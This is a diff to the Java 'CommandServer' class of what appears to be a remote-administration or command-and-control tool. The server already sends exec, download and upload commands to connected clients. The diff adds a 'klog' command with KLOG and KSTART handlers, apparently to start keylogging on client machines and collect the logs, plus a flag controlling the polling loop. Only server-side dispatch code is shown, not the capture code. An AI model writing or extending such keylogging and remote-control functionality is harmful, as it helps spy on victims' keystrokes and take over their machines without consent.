@@ -46,6 +46,8 @@ public class CommandServer implements RequestHandler, CommandHandler {
 	 */
 	private boolean clientConnected = false;
 	
+	private boolean communicating = false;
+	
 	/**
 	 * To log incoming out outgoing requests.
 	 */
@@ -96,12 +98,15 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		cmdsServer.put("exec", new ToClientCommand(this, "EXEC"));
 		cmdsServer.put("dwnld", new ToClientCommand(this, "DWNLD"));
 		cmdsServer.put("upld", new ToClientCommand(this, "UPLD"));
+		cmdsServer.put("klog", new ToClientCommand(this, "KLOG"));
 		
 		cmdsClient.put("DONE", new DoneCmd(this));
 		cmdsClient.put("GETID", new GetIdCmd(this));
 		cmdsClient.put("PING", new PingCmd(this));
 		cmdsClient.put("OUT", new OutCmd(this));
 		cmdsClient.put("UPLD", new UpldCmd(this));
+		cmdsClient.put("KLOG", new KlogCmd(this));
+		cmdsClient.put("KSTART", new KStartCmd(this));
 		
 	}
 
@@ -127,6 +132,14 @@ public class CommandServer implements RequestHandler, CommandHandler {
 
 	public void setClientConnected(boolean clientConnected) {
 		this.clientConnected = clientConnected;
+	}
+	
+	public boolean isCommunicating() {
+		return communicating;
+	}
+
+	public void setCommunicating(boolean communicating) {
+		this.communicating = communicating;
 	}
 
 	public Log getLog() {
@@ -204,22 +217,27 @@ public class CommandServer implements RequestHandler, CommandHandler {
 				ConnectedClient client = clients.get(currentClient);
 				
 				// Waiting for a command to be added
-				while (!client.hasCmd())
+				while (!client.hasCmd() && !communicating)
 					try {
 						Thread.sleep(50);
 					} catch (InterruptedException e) {
 						e.printStackTrace();
 					}
-				// Executing command
-				response = client.popCmd();
-				// Logging it
-				log.add(1, conn.getInetAddress() + "\t" + response);
-				// Writing it to output
-				conn.write(response);
+				
+				if (client.hasCmd()) {
+					// Executing command
+					response = client.popCmd();
+					// Logging it
+					log.add(1, conn.getInetAddress() + "\t" + response);
+					// Writing it to output
+					conn.write(response);
+				}
+				
 			}
 
 		}
 		
+		communicating = false;
 		clientConnected = false;
 		
 	}
